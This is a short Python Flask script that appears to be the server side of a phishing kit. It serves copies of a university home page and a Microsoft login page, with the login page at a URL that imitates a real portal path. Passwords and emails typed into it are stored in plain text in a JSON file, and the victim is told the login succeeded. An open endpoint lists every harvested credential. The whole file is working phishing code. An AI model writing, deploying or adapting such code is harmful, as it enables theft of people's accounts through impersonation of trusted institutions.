#!/usr/bin/env python3
from flask import Flask, request, send_from_directory, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CREDENTIALS_FILE = os.path.join(BASE_DIR, 'saved_credentials.json')

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'UTRGV_Home.html')

@app.route('/c/portal/login.html')
def login_page():
    return send_from_directory(BASE_DIR, 'Microsoft_Home.html')

@app.route('/api/login', methods=['POST'])
def handle_login():
    data = request.get_json()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()

    if not email or not password:
        return jsonify({'success': False, 'error': 'Email and password are required'}), 400

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = {'timestamp': timestamp, 'email': email, 'password': password}

    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
            try:
                all_credentials = json.load(f)
            except json.JSONDecodeError:
                all_credentials = []
    else:
        all_credentials = []

    all_credentials.append(entry)
    with open(CREDENTIALS_FILE, 'w', encoding='utf-8') as f:
        json.dump(all_credentials, f, indent=2)

    print(f"Saved credentials: {email} at {timestamp}")
    return jsonify({'success': True, 'message': 'Login successful'}), 200

@app.route('/api/credentials')
def view_credentials():
    if not os.path.exists(CREDENTIALS_FILE):
        return "No credentials saved yet.", 200
    with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>", 200

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory(BASE_DIR, filename)

if __name__ == '__main__':
    print("Server running at http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000)
